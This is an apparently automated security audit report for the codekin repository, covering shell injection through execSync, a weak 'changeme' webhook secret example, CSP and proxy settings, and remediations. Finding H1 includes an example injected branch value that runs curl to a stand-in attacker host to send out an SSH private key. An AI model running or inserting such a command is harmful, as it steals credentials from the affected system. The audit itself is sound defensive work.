# Security Audit: codekin

**Date**: 2026-05-21T03:33:38.345Z
**Repository**: /srv/repos/codekin
**Branch**: main
**Workflow Run**: d94b3360-38ec-43af-bbdb-f6c8402b0e97
**Session**: 4d494f97-184a-4887-8690-f51ee1e1b0fd

---

# Security Audit Report — Codekin
**Date:** 2026-05-21
**Auditor:** Automated Security Scan
**Repository:** `/srv/repos/codekin` (branch: `main`)

---

## Summary

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 1 |
| Medium | 3 |
| Low / Informational | 4 |

**Overall Risk Rating: Medium**

The codebase demonstrates strong security discipline: timing-safe cryptography, comprehensive input validation, DOMPurify-backed XSS prevention, parameterised SQL queries, magic-byte upload validation, and defence-in-depth rate limiting. One high-severity shell-injection risk was identified in a workflow script where unsanitised environment variables are interpolated into a shell command string. Three medium findings relate to information exposure and a weak-default documentation example. No hardcoded secrets were found in committed source files.

---

## Critical Findings

*None identified.*

---

## High Findings

### H1 — Shell Injection via Unsanitised `TARGET_BRANCH` / `TARGET_REPO` in `execSync`

| Attribute | Detail |
|---|---|
| **File** | `workflows/coverage-assessment.ts:93–100` |
| **Severity** | High |

**Description**

`execSync` is called with a template-literal string that interpolates both `cloneUrl` (derived from `TARGET_REPO`) and `TARGET_BRANCH` directly into the shell command:

```typescript
const cloneUrl = `https://github.com/${TARGET_REPO}.git`   // line 93
const output = execSync(
  `git ls-remote ${cloneUrl} refs/heads/${TARGET_BRANCH}`,  // line 99
  { encoding: 'utf8', timeout: 30_000 }
)
```

When `execSync` receives a string argument (not an array), Node.js passes it to `/bin/sh -c`. If an operator or CI pipeline sets `TARGET_BRANCH` to a value such as `main; curl attacker.com/exfil?t=$(cat ~/.ssh/id_rsa)`, arbitrary commands execute with the same privileges as the server process.

**Impact**

Although these values currently originate from operator-controlled environment variables rather than live user input, the pattern is inherently fragile. Any future pathway that populates `TARGET_REPO` or `TARGET_BRANCH` from a webhook payload, API parameter, or database row would immediately elevate this to critical remote code execution.

**Remediation**

Replace the string-argument form of `execSync` with `spawnSync` and pass arguments as an array, which bypasses the shell entirely:

```typescript
import { spawnSync } from 'child_process'

const result = spawnSync(
  'git',
  ['ls-remote', cloneUrl, `refs/heads/${TARGET_BRANCH}`],
  { encoding: 'utf8', timeout: 30_000 }
)
if (result.status !== 0) throw new Error(`git ls-remote failed: ${result.stderr}`)
const headSha = result.stdout.split('\t')[0].trim()
```

Additionally, validate `TARGET_BRANCH` against the pattern `/^[a-zA-Z0-9._/-]{1,200}$/` before use.

---

## Medium Findings

### M1 — Weak Default Secret Shown in Example Comments

| Attribute | Detail |
|---|---|
| **Files** | `server/stepflow-handler.ts:501`, `workflows/coverage-assessment.ts:31` |
| **Severity** | Medium |

**Description**

Two locations include `STEPFLOW_WEBHOOK_SECRET=changeme` in documentation comments as a usage example:

```
# server/stepflow-handler.ts:501
* STEPFLOW_WEBHOOK_SECRET=changeme     # HMAC-SHA256 secret (required when enabled)

# workflows/coverage-assessment.ts:31
STEPFLOW_WEBHOOK_SECRET=changeme \
```

While these are in comments rather than runtime assignments, operators who copy-paste examples verbatim would deploy with a trivially guessable secret, rendering HMAC verification effectively worthless.

**Impact**

Webhook signature bypass if operators follow the example without changing the value.

**Remediation**

Replace `changeme` with `<your-random-secret>` or `$(openssl rand -hex 32)` in all example snippets. Add a startup assertion in `stepflow-handler.ts` that rejects the literal value `changeme` with a fatal error.

---

### M2 — Webhook Secret Transiently Exposed in API Response

| Attribute | Detail |
|---|---|
| **File** | `server/webhook-setup-routes.ts:231` |
| **Severity** | Medium |

**Description**

When a new webhook is configured and a secret is auto-generated, the raw secret value is included in the JSON response body:

```typescript
secret: secretGenerated ? config.secret : undefined,  // line 231
```

This is intentional "show-once" UX. However, the secret travels over the network in plaintext and will appear in browser developer tools, any HTTP proxy logs, and application-level request/response logging if that is ever added.

**Impact**

Network-adjacent attackers or log-scraping tooling could capture the secret, enabling webhook spoofing.

**Remediation**

- Ensure the `/api/webhook/setup` endpoint is only reachable behind the existing auth middleware (verify this is the case).
- Add a `Pragma: no-store` / `Cache-Control: no-store` response header on this endpoint.
- Consider displaying the secret only in the UI after retrieval over the already-authenticated WebSocket channel rather than in a REST response body.

---

### M3 — CSP Allows `'unsafe-inline'` for Styles

| Attribute | Detail |
|---|---|
| **File** | `server/ws-server.ts:314` |
| **Severity** | Medium |

**Description**

The Content Security Policy includes `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`. The `'unsafe-inline'` directive permits arbitrary inline `<style>` blocks and `style=` attributes, which can be abused for CSS-based data exfiltration (e.g., CSS injection to leak sensitive attribute values from the DOM).

**Impact**

An XSS vector that injects HTML but cannot execute scripts could still exfiltrate data via CSS-based techniques.

**Remediation**

Introduce nonce-based or hash-based style allowlisting. TailwindCSS 4 supports a nonce attribute that can be threaded through from server to client. Alternatively, extract all dynamic styles to external `.css` files to eliminate the need for `'unsafe-inline'`.

---

## Low / Informational Findings

### L1 — `dangerouslySetInnerHTML` Usage (Mitigated)

| **File** | `src/components/MarkdownRenderer.tsx:21` |
|---|---|

React's `dangerouslySetInnerHTML` is used to render sanitised HTML. The output passes through the `markdownPipeline` (`src/components/markdownPipeline.ts:43`) which applies `DOMPurify.sanitize()` before any DOM insertion. This is the correct pattern. No action required, but any future refactoring that removes or bypasses the sanitisation step would introduce XSS.

---

### L2 — OpenCode Password Transmitted Over Plaintext localhost HTTP

| **File** | `server/opencode-process.ts:166–168`, `server/opencode-process.ts:192` |
|---|---|

The auto-generated `opencode` server password is Base64-encoded and sent as an HTTP `Authorization: Basic` header to `http://localhost:<port>`. While localhost traffic does not traverse the network, other local processes running as the same user or under a compromised process could intercept loopback traffic. The `randomUUID()` source is cryptographically adequate. Risk is low given the localhost scope.

**Recommendation:** If `opencode` supports Unix domain sockets, prefer those over TCP to eliminate any loopback sniffing surface.

---

### L3 — `TRUST_PROXY` Allows IP Spoofing if Misconfigured

| **File** | `server/ws-server.ts:457` |
|---|---|

When `TRUST_PROXY=true`, the server trusts `X-Forwarded-For` headers for IP-based rate limiting. If this flag is accidentally enabled without a reverse proxy, any client can spoof its source IP and bypass per-IP rate limits.

**Recommendation:** Document clearly in the deployment guide that `TRUST_PROXY` must only be set when a trusted reverse proxy (nginx, Caddy, etc.) is in front of the server. Consider adding a startup warning if `TRUST_PROXY=true` and the server is listening on a public interface.

---

### L4 — GitHub Webhook Always Sets `insecure_ssl: '0'` (Positive Confirmation)

| **File** | `server/webhook-github-setup.ts:104, 134` |
|---|---|

GitHub webhook configuration explicitly sets `insecure_ssl: '0'` (TLS verification enabled) in all webhook creation and update calls. This is the secure and correct setting. Noted here for completeness.

---

## Secrets & Credentials Exposure

| Finding | Location | Type | Status |
|---|---|---|---|
| No hardcoded secrets in source | — | — | Clean |
| Example value `changeme` in comments | `server/stepflow-handler.ts:501`, `workflows/coverage-assessment.ts:31` | Placeholder secret in docs | **See M1** |
| All runtime secrets via env vars | `server/config.ts`, `server/webhook-config.ts`, `server/stepflow-handler.ts:509` | AUTH_TOKEN, GITHUB_WEBHOOK_SECRET, STEPFLOW_WEBHOOK_SECRET | Correct |
| Comprehensive log redaction | `server/crypto-utils.ts:9–24` | Redacts Bearer tokens, passwords, API keys in all log output | Correct |

No `.env` files are committed to the repository. No API keys, private keys, or bearer tokens were found embedded in source files.

`git log --all --oneline` (last 20 commits) shows no commit messages suggesting accidental secret commits (e.g., "remove token", "fix: delete key"). No sensitive patterns were detected in commit history metadata.

---

## Recommendations

Ordered by risk impact:

1. **[High — Immediate]** Replace `execSync` string-form in `workflows/coverage-assessment.ts:99` with `spawnSync` + argument array to eliminate shell injection risk. Add input validation for `TARGET_BRANCH` (allow only `[a-zA-Z0-9._/-]`).

2. **[Medium — Near-term]** Remove the `STEPFLOW_WEBHOOK_SECRET=changeme` placeholder from documentation comments (`server/stepflow-handler.ts:501`, `workflows/coverage-assessment.ts:31`). Add a startup guard that refuses to start if the secret equals `changeme`.

3. **[Medium — Near-term]** Add `Cache-Control: no-store` and `Pragma: no-store` headers to the webhook setup API response that returns the generated secret (`server/webhook-setup-routes.ts:231`). Confirm the endpoint is protected by auth middleware.

4. **[Medium — Planned]** Migrate the CSP `style-src` directive from `'unsafe-inline'` to nonce-based or hash-based allowlisting. Coordinate with TailwindCSS 4's nonce support to avoid breaking production builds.

5. **[Low — Operational]** Document the `TRUST_PROXY` flag requirements explicitly in the deployment guide, and add a runtime warning when `TRUST_PROXY=true` is detected without a standard reverse-proxy `X-Forwarded-For` setup.

6. **[Low — Future]** If the `opencode` integration adds network-accessible endpoints or moves beyond localhost, upgrade inter-process communication to a Unix domain socket or mutual-TLS to eliminate plaintext password transmission on loopback.

7. **[Informational — Ongoing]** Continue enforcing `no-shell` subprocess spawning as a project convention. Consider adding an ESLint rule (e.g., a custom rule or `eslint-plugin-security`) that flags `execSync`/`exec` with string arguments and `shell: true` in CI.

8. **[Informational — Ongoing]** Add automated secret-scanning to CI (e.g., `trufflehog`, `detect-secrets`, or GitHub's built-in secret scanning) to catch accidental credential commits before they reach the repository.